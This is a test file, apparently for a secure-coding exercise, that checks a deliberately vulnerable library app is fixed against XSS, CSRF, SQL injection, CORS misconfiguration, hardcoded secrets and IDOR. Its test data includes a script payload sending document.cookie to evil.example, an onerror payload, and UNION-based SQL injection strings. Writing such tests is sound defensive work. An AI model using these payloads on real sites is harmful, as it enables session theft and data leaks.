import { PGlite } from '@electric-sql/pglite';
import { readFileSync } from 'node:fs';
import request from 'supertest';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from 'vitest';
import { createApp } from './01-vulnerable-app.js';

const FRONT_END = 'http://localhost:5173';
const EVIL = 'http://evil.example';
const LEAKED_KEY = 'library-admin-7f3a9c';

let template;
let db;
let app;

beforeAll(async () => {
	template = new PGlite();
	await template.exec(readFileSync(new URL('../library.sql', import.meta.url), 'utf8'));
}, 30_000);

afterAll(async () => {
	await template.close();
});

beforeEach(async () => {
	db = await template.clone();
	app = createApp(db, { ADMIN_KEY: 'test-key-123' });
});

afterEach(async () => {
	await db.close();
});

async function loggedInAs(email) {
	const agent = request.agent(app);
	const res = await agent.post('/login').send({ email });
	expect(res.status, `log in as ${email}`).toBe(200);
	return agent;
}

const ada = () => loggedInAs('ada@example.com');
const grace = () => loggedInAs('grace@example.com');

describe('1. XSS: cross-site scripting', () => {
	async function pageAfterReview(body) {
		const agent = await ada();
		const created = await agent.post('/books/1/reviews').send({ body });
		expect(created.status).toBe(201);
		return request(app).get('/books/1/page');
	}

	test('a review cannot add a script tag to the page, and its text is still shown', async () => {
		const res = await pageAfterReview(`<script>fetch('http://evil.example/?c=' + document.cookie)</script>`);
		expect(res.status).toBe(200);
		expect(res.text).not.toContain('<script>');
		expect(res.text).toContain('&lt;script&gt;');
	});

	test('a review cannot add an element with an event handler', async () => {
		const res = await pageAfterReview('<img src=x onerror=alert(1)>');
		expect(res.text).not.toContain('<img');
		expect(res.text).toContain('&lt;img');
	});

	test('quotes and ampersands in a review are written as HTML entities, and book details still show', async () => {
		const res = await pageAfterReview(`Fish & Chips <3 "quoted" it's fine`);
		expect(res.text).toContain('Fish &amp; Chips &lt;3 &quot;quoted&quot; it&#39;s fine');
		expect(res.text).toContain('<h1>Kindred</h1>');
		expect(res.text).toContain('Octavia E. Butler');
	});
});

describe('2. CSRF: cross-site request forgery', () => {
	async function emailOf(id) {
		const { rows } = await db.query('SELECT email FROM members WHERE id = $1', [id]);
		return rows[0].email;
	}

	test('a form posted from another website cannot change the logged-in member\'s email', async () => {
		const agent = await ada();
		const forged = await agent.post('/me/email').set('Origin', EVIL).type('form').send({ email: 'attacker@evil.example' });
		expect(forged.status).toBe(403);
		expect(await emailOf(1)).toBe('ada@example.com');
	});

	test('the front end can still change the email, and so can a client that sends no Origin', async () => {
		const agent = await ada();
		const forged = await agent.post('/me/email').set('Origin', EVIL).send({ email: 'attacker@evil.example' });
		expect(forged.status).toBe(403);

		const fromFrontEnd = await agent.post('/me/email').set('Origin', FRONT_END).send({ email: 'ada@new.example' });
		expect(fromFrontEnd.status).toBe(200);
		expect(await emailOf(1)).toBe('ada@new.example');

		const fromCurl = await agent.post('/me/email').send({ email: 'ada@curl.example' });
		expect(fromCurl.status).toBe(200);
		expect(await emailOf(1)).toBe('ada@curl.example');
	});

	test('the session cookie is HttpOnly and SameSite', async () => {
		const res = await request(app).post('/login').send({ email: 'ada@example.com' });
		const cookie = res.headers['set-cookie'].join('\n');
		expect(cookie).toMatch(/^sid=/);
		expect(cookie).toContain('HttpOnly');
		expect(cookie).toMatch(/SameSite=(Lax|Strict)/);
	});
});

describe('3. SQL injection', () => {
	test('an author name that is really SQL does not list every book', async () => {
		const real = await request(app).get('/books').query({ author: 'Octavia E. Butler' });
		expect(real.body.map((book) => book.title)).toEqual(['Kindred']);

		const attack = await request(app).get('/books').query({ author: `' OR '1'='1` });
		expect(attack.status).toBe(200);
		expect(attack.body).toEqual([]);
	});

	test('a UNION attack cannot read the members table', async () => {
		const attack = await request(app)
			.get('/books')
			.query({ author: `' UNION SELECT id, email, name, 0 FROM members --` });
		expect(attack.text).not.toContain('@example.com');
		expect(attack.body).toEqual([]);
	});

	test('an author with an apostrophe in the name can be searched', async () => {
		const res = await request(app).get('/books').query({ author: `Madeleine L'Engle` });
		expect(res.status).toBe(200);
		expect(res.body.map((book) => book.title)).toEqual(['A Wrinkle in Time']);
	});
});

describe('4. CORS', () => {
	test('only the front end is allowed to read responses from another origin', async () => {
		const frontEnd = await request(app).get('/books').set('Origin', FRONT_END);
		expect(frontEnd.headers['access-control-allow-origin']).toBe(FRONT_END);
		expect(frontEnd.headers['access-control-allow-credentials']).toBe('true');

		const evil = await request(app).get('/books').set('Origin', EVIL);
		expect(evil.headers['access-control-allow-origin']).toBeUndefined();
		expect(evil.headers['access-control-allow-credentials']).toBeUndefined();
	});

	test('a preflight request is approved for the front end and not for other sites', async () => {
		const frontEnd = await request(app)
			.options('/me/email')
			.set('Origin', FRONT_END)
			.set('Access-Control-Request-Method', 'POST');
		expect(frontEnd.status).toBe(204);
		expect(frontEnd.headers['access-control-allow-origin']).toBe(FRONT_END);
		expect(frontEnd.headers['access-control-allow-methods']).toContain('POST');

		const evil = await request(app)
			.options('/me/email')
			.set('Origin', EVIL)
			.set('Access-Control-Request-Method', 'POST');
		expect(evil.headers['access-control-allow-origin']).toBeUndefined();
		expect(evil.headers['access-control-allow-methods']).toBeUndefined();
	});

	test('the "null" origin of sandboxed pages is not trusted, and responses say they vary by Origin', async () => {
		const sandboxed = await request(app).get('/books').set('Origin', 'null');
		expect(sandboxed.headers['access-control-allow-origin']).toBeUndefined();

		const frontEnd = await request(app).get('/books').set('Origin', FRONT_END);
		expect(frontEnd.headers.vary ?? '').toMatch(/Origin/i);
	});
});

describe('5. Secrets in code', () => {
	test('the admin key comes from the environment, and the key that was in the code stops working', async () => {
		const wrong = await request(app).delete('/books/4').set('x-admin-key', LEAKED_KEY);
		expect(wrong.status).toBe(401);
		const { rows: stillThere } = await db.query('SELECT id FROM books WHERE id = 4');
		expect(stillThere).toHaveLength(1);

		const right = await request(app).delete('/books/4').set('x-admin-key', 'test-key-123');
		expect(right.status).toBe(204);
		const { rows: gone } = await db.query('SELECT id FROM books WHERE id = 4');
		expect(gone).toHaveLength(0);
	});

	test('when ADMIN_KEY is not set, nobody is an admin, not even with an empty or missing key', async () => {
		const unconfigured = createApp(db, {});
		const withOldKey = await request(unconfigured).delete('/books/4').set('x-admin-key', LEAKED_KEY);
		const withNoKey = await request(unconfigured).delete('/books/4');
		const withEmptyKey = await request(unconfigured).delete('/books/4').set('x-admin-key', '');
		expect([withOldKey.status, withNoKey.status, withEmptyKey.status]).toEqual([401, 401, 401]);

		const { rows } = await db.query('SELECT id FROM books WHERE id = 4');
		expect(rows).toHaveLength(1);
	});
});

describe('6. Missing access control (IDOR)', () => {
	test('a loan can only be read by someone who is logged in', async () => {
		const anonymous = await request(app).get('/loans/1');
		expect(anonymous.status).toBe(401);
		expect(anonymous.body.memberId).toBeUndefined();

		const owner = await (await ada()).get('/loans/1');
		expect(owner.status).toBe(200);
		expect(owner.body).toMatchObject({ id: 1, bookId: 1, memberId: 1, returnedAt: null });
	});

	test('a member cannot read another member\'s loan by changing the id in the URL', async () => {
		const agent = await grace();
		const someoneElses = await agent.get('/loans/1');
		expect(someoneElses.status).toBe(403);
		expect(someoneElses.body.bookId).toBeUndefined();

		const own = await agent.get('/loans/2');
		expect(own.status).toBe(200);
		expect(own.body.memberId).toBe(2);

		const missing = await agent.get('/loans/999');
		expect(missing.status).toBe(404);
	});
});
